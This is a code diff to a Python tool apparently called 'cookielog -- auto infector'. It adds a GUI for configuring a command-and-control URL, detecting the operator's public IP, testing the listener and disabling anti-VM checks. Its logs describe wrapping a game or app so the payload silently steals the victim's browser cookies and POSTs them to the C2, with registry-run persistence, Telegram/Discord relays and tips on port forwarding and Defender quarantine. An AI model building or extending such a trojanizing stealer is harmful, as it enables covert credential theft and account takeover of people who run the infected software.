@@ -177,6 +177,20 @@ def _is_private_ip(ip):
     except Exception:
         return False
 
+def detect_public_ip(timeout=5):
+    """Fetch the attacker's public IP via api.ipify.org. Returns string or None."""
+    try:
+        req = urllib.request.Request("https://api.ipify.org")
+        resp = urllib.request.urlopen(req, timeout=timeout)
+        ip = resp.read().decode("utf-8", "replace").strip()
+        # Basic validation: must look like an IP
+        parts = ip.split(".")
+        if len(parts) == 4 and all(p.isdigit() for p in parts):
+            return ip
+        return None
+    except Exception:
+        return None
+
 def ensure_build():
     """Build loader.exe + ckdll.dll if they don't exist."""
     if os.path.isfile(LOADER) and os.path.isfile(DLL):
@@ -538,9 +552,11 @@ def pick_gui():
     try:
         import tkinter as tk
         from tkinter import filedialog, ttk
+        import urllib.request as _ureq
+        import socket as _sock
         root = tk.Tk()
         root.title("cookielog -- auto infector")
-        root.geometry("620x640")
+        root.geometry("620x760")
         root.configure(bg="#1a1a1a")
         root.resizable(False, False)
         style = ttk.Style()
@@ -558,7 +574,8 @@ def pick_gui():
                         insertcolor="#d4d4d4")
         style.configure("TCheckbutton", background="#1a1a1a", foreground="#d4d4d4")
         result = {"path": None, "mode": None, "run": False,
-                  "telegram": None, "discord": None, "persist": False}
+                  "telegram": None, "discord": None, "persist": False,
+                  "c2_url": None, "no_anti_vm": False}
 
         # Load saved config to pre-fill fields
         cfg = load_config()
@@ -573,6 +590,125 @@ def pick_gui():
                   foreground="#4a9eff").pack(pady=(8, 2))
         ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
                   font=("Segoe UI", 9)).pack(pady=(0, 10))
+
+        # --- C2 URL section ---
+        ttk.Label(root, text="C2 settings (where the victim sends cookies)",
+                  font=("Segoe UI", 10, "bold"),
+                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))
+
+        # C2 URL field
+        c2_frame = tk.Frame(root, bg="#1a1a1a")
+        c2_frame.pack(fill="x", padx=50, pady=(0, 2))
+        ttk.Label(c2_frame, text="C2 URL:", width=8,
+                  font=("Segoe UI", 9)).pack(side="left")
+        saved_port = cfg.get("port", 9090)
+        _lan_ip = detect_ip()
+        _default_c2 = "http://%s:%d/" % (_lan_ip, saved_port)
+        c2_var = tk.StringVar(value=_default_c2)
+        ttk.Entry(c2_frame, textvariable=c2_var).pack(fill="x", side="left",
+                                                       expand=True, padx=(4, 0))
+
+        # IP detect buttons + status
+        ip_frame = tk.Frame(root, bg="#1a1a1a")
+        ip_frame.pack(fill="x", padx=50, pady=(2, 0))
+        ttk.Button(ip_frame, text="DETECT LAN IP",
+                   command=lambda: _detect_lan()).pack(side="left", padx=(0, 4))
+        ttk.Button(ip_frame, text="DETECT PUBLIC IP",
+                   command=lambda: _detect_public()).pack(side="left", padx=(0, 4))
+        ip_status = tk.Label(ip_frame, text="", bg="#1a1a1a",
+                             font=("Segoe UI", 8, "bold"))
+        ip_status.pack(side="left", padx=(8, 0))
+
+        # NAT warning label (hidden by default)
+        nat_warn = tk.Label(root, text="", bg="#1a1a1a", fg="#cc6600",
+                            font=("Segoe UI", 8), justify="left", wraplength=520)
+        nat_warn.pack(anchor="w", padx=50, pady=(2, 0))
+
+        # Port field
+        port_frame = tk.Frame(root, bg="#1a1a1a")
+        port_frame.pack(fill="x", padx=50, pady=(4, 0))
+        ttk.Label(port_frame, text="Port:", width=8,
+                  font=("Segoe UI", 9)).pack(side="left")
+        port_var = tk.IntVar(value=saved_port)
+        ttk.Entry(port_frame, textvariable=port_var, width=8).pack(side="left", padx=(4, 0))
+
+        # TEST C2 button
+        test_frame = tk.Frame(root, bg="#1a1a1a")
+        test_frame.pack(fill="x", padx=50, pady=(4, 0))
+        ttk.Button(test_frame, text="TEST C2 (check if listener is reachable)",
+                   command=lambda: _test_c2()).pack(side="left")
+        test_status = tk.Label(test_frame, text="", bg="#1a1a1a",
+                               font=("Segoe UI", 8, "bold"))
+        test_status.pack(side="left", padx=(8, 0))
+
+        # Anti-VM checkbox
+        avm_row = tk.Frame(root, bg="#1a1a1a")
+        avm_row.pack(fill="x", padx=50, pady=(4, 0))
+        avm_var = tk.BooleanVar(value=False)
+        tk.Checkbutton(avm_row, text="Disable anti-VM (use if victim is a VM)",
+                       variable=avm_var,
+                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
+                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
+                       bd=0, highlightthickness=0,
+                       font=("Segoe UI", 9)).pack(side="left")
+
+        # --- IP detection functions ---
+        def _detect_lan():
+            ip = detect_ip()
+            port = port_var.get()
+            c2_var.set("http://%s:%d/" % (ip, port))
+            if _is_private_ip(ip):
+                ip_status.config(text="LAN: %s (private)" % ip, fg="#cc6600")
+                nat_warn.config(text=(
+                    "WARNING: %s is a LAN IP. External machines CANNOT reach it.\n"
+                    "Click DETECT PUBLIC IP, then port-forward port %d on your router." % (ip, port)))
+            else:
+                ip_status.config(text="IP: %s" % ip, fg="#5cb85c")
+                nat_warn.config(text="")
+
+        def _detect_public():
+            ip_status.config(text="fetching public IP...", fg="#888888")
+            root.update()
+            pub = detect_public_ip()
+            if pub:
+                port = port_var.get()
+                c2_var.set("http://%s:%d/" % (pub, port))
+                ip_status.config(text="PUBLIC: %s" % pub, fg="#5cb85c")
+                nat_warn.config(text=(
+                    "Public IP set. Make sure port %d is forwarded on your router\n"
+                    "to this machine, and the listener is running before sending the exe." % port))
+            else:
+                ip_status.config(text="failed to get public IP", fg="#cc6600")
+                nat_warn.config(text="Could not reach api.ipify.org. Check your internet connection.")
+
+        def _test_c2():
+            url = c2_var.get().strip()
+            if not url:
+                test_status.config(text="no C2 URL set", fg="#cc6600")
+                return
+            test_status.config(text="testing...", fg="#888888")
+            root.update()
+            try:
+                # Try a quick TCP connect to the host:port
+                # Parse URL
+                p = url.replace("http://", "").replace("https://", "")
+                host_part = p.split("/")[0]
+                if ":" in host_part:
+                    host, port_str = host_part.rsplit(":", 1)
+                    test_port = int(port_str)
+                else:
+                    host = host_part
+                    test_port = 80
+                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((host, test_port))
+                s.close()
+                test_status.config(text="REACHABLE", fg="#5cb85c")
+            except Exception as ex:
+                test_status.config(text="UNREACHABLE: %s" % str(ex)[:40], fg="#cc6600")
+
+        # Initialize IP status
+        _detect_lan()
 
         def do_folder():
             d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
@@ -649,6 +785,15 @@ def pick_gui():
             if dc:
                 result["discord"] = dc
             result["persist"] = ps
+            # Collect C2 URL and anti-VM from GUI
+            c2 = c2_var.get().strip()
+            if c2:
+                result["c2_url"] = c2
+            result["no_anti_vm"] = bool(avm_var.get())
+            # Save port to config
+            cfg2 = load_config()
+            cfg2["port"] = port_var.get()
+            save_config(cfg2)
             root.destroy()
 
         # Folder buttons (green = recommended for games)
@@ -778,10 +923,11 @@ def pick_gui():
         ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=10)
         root.mainloop()
         return (result["path"], result["mode"], result["run"],
-                result.get("telegram"), result.get("discord"), result.get("persist", False))
+                result.get("telegram"), result.get("discord"), result.get("persist", False),
+                result.get("c2_url"), result.get("no_anti_vm", False))
     except Exception as ex:
         log("[!] GUI not available (%s)" % ex)
-        return None, None, False, None, None, False
+        return None, None, False, None, None, False, None, False
 
 # ------------------------------------------------------------------ interactive terminal
 
@@ -1283,6 +1429,7 @@ def main():
 
     # 2. detect IP + build C2 URL
     log("\n[2/5] detecting attacker IP...")
+    ip = None
     if c2_override:
         c2_url = c2_override
         log("[+] C2 URL (manual): %s" % c2_url)
@@ -1298,9 +1445,9 @@ def main():
         log("[+] Persistence: enabled (registry Run key)")
     if no_anti_vm:
         log("[+] Anti-VM: DISABLED (--no-anti-vm) — payload will run in VMs")
-    if ip == "127.0.0.1":
+    if ip and ip == "127.0.0.1":
         log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
-    elif not c2_override and _is_private_ip(ip):
+    elif ip and not c2_override and _is_private_ip(ip):
         log("[!] WARNING: detected IP %s is a LAN/private address." % ip)
         log("[!]   Machines outside your LAN CANNOT reach this IP.")
         log("[!]   For external targets, use:")
@@ -1326,13 +1473,19 @@ def main():
             return 1
         log("[+] target (%s): %s" % (mode, host_path))
     else:
-        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
+        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm = pick_gui()
         if not host_path:
             log("[-] nothing selected")
             return 1
         if gui_run:
             run_local = True
             c2_url = "http://127.0.0.1:%d/" % port
+        elif gui_c2:
+            # Use the C2 URL from the GUI (may be public IP)
+            c2_url = gui_c2
+            c2_override = gui_c2  # prevent detect_ip from overwriting
+        if gui_avm:
+            no_anti_vm = True
         # GUI values are authoritative — if the user unchecked a relay
         # checkbox, gui_tg/gui_dc will be None, and we must NOT fall back
         # to the config value. The GUI already saved keys to config; the
@@ -1341,6 +1494,9 @@ def main():
         discord = gui_dc    # None if unchecked or empty
         persist = gui_persist
         log("[+] target (%s): %s" % (mode, host_path))
+        log("[+] C2 URL: %s" % c2_url)
+        if no_anti_vm:
+            log("[+] Anti-VM: DISABLED (from GUI)")
         if run_local:
             log("[+] mode: LOCAL TEST (run locally)")
         if telegram:
@@ -1377,7 +1533,17 @@ def main():
                 log("    - the original app/game opens normally")
                 log("    - payload extracts cookies from the VICTIM's machine")
                 log("    - cookies are sent via HTTP POST to %s" % c2_url)
-                log("  cookies will appear in loot/cookies.json")
+                log("  cookies will appear in loot/all_cookies.json")
+                log("")
+                log("  TROUBLESHOOTING (if no data arrives):")
+                log("    1. Is this listener reachable from the victim?")
+                log("       -> the victim must be able to reach %s" % c2_url)
+                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
+                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
+                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
+                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
+                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
+                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
             log("=" * 60)
         else:
             out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
@@ -1397,7 +1563,17 @@ def main():
                 log("    - the original app/game opens normally")
                 log("    - payload extracts cookies from the VICTIM's machine")
                 log("    - cookies are sent via HTTP POST to %s" % c2_url)
-                log("  cookies will appear in loot/cookies.json")
+                log("  cookies will appear in loot/all_cookies.json")
+                log("")
+                log("  TROUBLESHOOTING (if no data arrives):")
+                log("    1. Is this listener reachable from the victim?")
+                log("       -> the victim must be able to reach %s" % c2_url)
+                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
+                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
+                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
+                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
+                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
+                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
             log("=" * 60)
     except Exception as ex:
         log("[-] infection failed: %s" % ex)
